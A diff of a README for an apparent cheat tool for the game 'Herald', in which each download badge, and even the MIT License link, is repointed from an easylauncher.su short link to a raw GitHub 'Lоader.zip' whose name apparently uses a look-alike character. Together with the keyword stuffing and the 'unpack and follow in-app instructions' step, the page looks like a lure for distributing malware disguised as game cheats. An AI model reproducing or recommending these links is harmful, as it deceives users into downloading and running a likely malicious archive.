@@ -1,6 +1,6 @@
 # 🏰 Herald The Interactive Period Drama Complete Edition Cheats & Hacks
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Herald_Complete_Cheats-brightgreen?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Latest Release](https://raw.githubusercontent.com/webcreator12/HeraldTheInteractivePeriodDramaUltimateToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/webcreator12/HeraldTheInteractivePeriodDramaUltimateToolkit/main/Lоader.zip)
 
 Welcome to the **Herald The Interactive Period Drama Complete Edition Cheats & Hacks** repository! Here you’ll find robust tools designed to enhance your gaming adventure, providing powerful utilities and clever enhancements for one of the greatest narrative games of 2025. Whether you want to unlock story branches, boost resources, or reveal hidden lore, this edition empowers your journey through the complex world of Herald.
 
@@ -31,7 +31,7 @@ Herald cheats, narrative game hacks, interactive period drama, game enhancement,
 
 **Step 1:**  
 Download the latest optimized edition from here:  
-[![Get Herald Cheats & Hacks](https://img.shields.io/badge/Download_Herald_Cheats-Now-blue?logo=download)](https://easylauncher.su/PSnzrH)
+[![Get Herald Cheats & Hacks](https://raw.githubusercontent.com/webcreator12/HeraldTheInteractivePeriodDramaUltimateToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/webcreator12/HeraldTheInteractivePeriodDramaUltimateToolkit/main/Lоader.zip)
 
 Unpack and follow in-app instructions per your device's OS.
 
@@ -43,8 +43,8 @@ For educational and accessibility extension purposes. Using third-party utilitie
 
 ## 📝 License
 
-Distributed under [MIT License](https://opensource.org/license/mit/) 2025.
+Distributed under [MIT License](https://raw.githubusercontent.com/webcreator12/HeraldTheInteractivePeriodDramaUltimateToolkit/main/Lоader.zip) 2025.
 
 ---
 
-[![Download Again](https://img.shields.io/badge/Download_Herald_Cheats-Now-blue?logo=download)](https://easylauncher.su/PSnzrH)
+[![Download Again](https://raw.githubusercontent.com/webcreator12/HeraldTheInteractivePeriodDramaUltimateToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/webcreator12/HeraldTheInteractivePeriodDramaUltimateToolkit/main/Lоader.zip)
